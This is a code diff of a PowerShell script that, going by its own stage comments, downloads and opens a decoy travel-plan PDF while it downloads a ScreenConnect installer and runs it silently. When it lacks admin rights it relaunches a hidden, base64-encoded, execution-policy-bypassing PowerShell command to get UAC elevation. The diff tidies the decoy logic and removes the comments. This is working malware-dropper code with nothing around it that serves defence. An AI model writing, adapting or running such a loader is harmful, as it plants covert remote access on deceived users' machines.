@@ -37,29 +37,24 @@ try {
 } catch {}
 
 # === 2. Download Travel Plan PDF Decoy ===
+$pdfDownloaded = $false
 if ($pdfUrl) {
     try {
         $wc = New-Object System.Net.WebClient
         $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
         $wc.DownloadFile($pdfUrl, $pdfPath)
+        if (Test-Path $pdfPath) { $pdfDownloaded = $true }
     } catch {}
 }
 
 # === 3. Open PDF in Edge Browser (Decoy) ===
-$edgePaths = @(
-    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
-    "C:\Program Files\Microsoft\Edge\Application\msedge.exe",
-    "C:\Windows\System32\msedge.exe"
-)
-$edgePath = $null
-foreach ($ep in $edgePaths) {
-    if (Test-Path $ep) { $edgePath = $ep; break }
-}
-
-if ($edgePath -and (Test-Path $pdfPath)) {
-    Start-Process $edgePath -ArgumentList "--new-window `"$pdfPath`""
-} elseif (Test-Path $pdfPath) {
-    Start-Process $pdfPath
+if ($pdfDownloaded) {
+    $edgePath = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
+    if (Test-Path $edgePath) {
+        Start-Process $edgePath -ArgumentList "`"$pdfPath`""
+    } else {
+        Start-Process "msedge.exe" -ArgumentList "`"$pdfPath`""
+    }
 }
 
 # === 4. Download ScreenConnect MSI ===
@@ -74,14 +69,11 @@ try {
 
 # === 5. Execute ScreenConnect Silent Install (Admin Required) ===
 if (Test-Path $msiPath) {
-    # Check if already running as admin
     $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
     
     if ($isAdmin) {
-        # Already admin - install directly
         Start-Process "msiexec.exe" -ArgumentList "/i `"$msiPath`" /qn /norestart" -WindowStyle Hidden -Wait
     } else {
-        # Need admin - re-launch with UAC elevation
         $installCmd = "Start-Process 'msiexec.exe' -ArgumentList '/i `"$msiPath`" /qn /norestart' -WindowStyle Hidden -Wait"
         $encodedCmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($installCmd))
         Start-Process "powershell.exe" -ArgumentList "-NoP -W Hidden -EP Bypass -EncodedCommand $encodedCmd" -Verb RunAs -Wait
